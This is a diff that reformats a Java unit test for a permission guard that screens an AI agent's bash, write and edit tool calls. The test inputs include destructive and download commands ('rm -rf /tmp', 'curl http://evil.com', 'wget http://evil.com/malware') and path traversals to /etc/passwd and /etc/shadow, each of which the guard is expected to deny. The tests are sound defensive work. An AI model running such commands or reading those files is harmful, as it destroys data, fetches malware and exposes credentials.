@@ -185,26 +185,33 @@ class PermissionDecisionTest {
 
         // Verify original patterns still work
         StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "rm -rf /tmp")))
-                .assertNext(d -> {
-                    assertFalse(d.allowed());
-                    assertEquals("dangerous-command", d.policyId());
-                })
+                .assertNext(
+                        d -> {
+                            assertFalse(d.allowed());
+                            assertEquals("dangerous-command", d.policyId());
+                        })
                 .verifyComplete();
 
         // Verify first custom pattern works
-        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "curl http://evil.com")))
-                .assertNext(d -> {
-                    assertFalse(d.allowed());
-                    assertEquals("dangerous-command", d.policyId());
-                })
+        StepVerifier.create(
+                        guard.checkPermissionDetail(
+                                "bash", Map.of("command", "curl http://evil.com")))
+                .assertNext(
+                        d -> {
+                            assertFalse(d.allowed());
+                            assertEquals("dangerous-command", d.policyId());
+                        })
                 .verifyComplete();
 
         // Verify second custom pattern works
-        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "wget http://evil.com/malware")))
-                .assertNext(d -> {
-                    assertFalse(d.allowed());
-                    assertEquals("dangerous-command", d.policyId());
-                })
+        StepVerifier.create(
+                        guard.checkPermissionDetail(
+                                "bash", Map.of("command", "wget http://evil.com/malware")))
+                .assertNext(
+                        d -> {
+                            assertFalse(d.allowed());
+                            assertEquals("dangerous-command", d.policyId());
+                        })
                 .verifyComplete();
 
         // Verify safe command still allowed
@@ -219,20 +226,22 @@ class PermissionDecisionTest {
         StepVerifier.create(
                         guard.checkPermissionDetail(
                                 "write", Map.of("file_path", "../../../etc/passwd")))
-                .assertNext(d -> {
-                    assertFalse(d.allowed());
-                    assertEquals("sensitive-path", d.policyId());
-                })
+                .assertNext(
+                        d -> {
+                            assertFalse(d.allowed());
+                            assertEquals("sensitive-path", d.policyId());
+                        })
                 .verifyComplete();
 
         // Another traversal variant
         StepVerifier.create(
                         guard.checkPermissionDetail(
                                 "edit", Map.of("path", "/tmp/safe/../../etc/shadow")))
-                .assertNext(d -> {
-                    assertFalse(d.allowed());
-                    assertEquals("sensitive-path", d.policyId());
-                })
+                .assertNext(
+                        d -> {
+                            assertFalse(d.allowed());
+                            assertEquals("sensitive-path", d.policyId());
+                        })
                 .verifyComplete();
     }
 
